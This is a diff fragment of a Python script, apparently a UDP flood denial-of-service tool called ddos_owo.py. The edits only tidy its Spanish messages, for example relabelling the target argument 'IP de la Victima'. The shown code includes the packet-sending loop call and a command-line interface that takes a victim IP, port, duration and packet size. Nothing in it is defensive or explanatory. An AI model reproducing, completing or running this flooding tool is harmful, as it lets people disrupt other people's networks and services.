@@ -36,12 +36,12 @@ def attack(ip, port, time, size):
 
         sock.sendto(size, (ip, port))
 
-    print('Ataque Finalizado Perro.')
+    print('Ataque Finalizado.')
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='Usa esto: python ddos_owo.py <ip> <port> <time> <size>')
+    parser = argparse.ArgumentParser(description='Comando: python ddos_owo.py <ip> <port> <time> <size>')
 
-    parser.add_argument('ip', type=str, help='IP de la persona puto xd')
+    parser.add_argument('ip', type=str, help='IP de la Victima')
     parser.add_argument('-p', '--port', type=int, default=None, help='Puerto.')
     parser.add_argument('-t', '--time', type=int, default=None, help='Tiempo.')
     parser.add_argument('-s', '--size', type=int, default=1024, help='Paquetes.')
@@ -51,4 +51,4 @@ if __name__ == '__main__':
     try:
         attack(args.ip, args.port, args.time, args.size)
     except KeyboardInterrupt:
-        print('Ataque Detenido')
+        print('Ataque Detenido.')
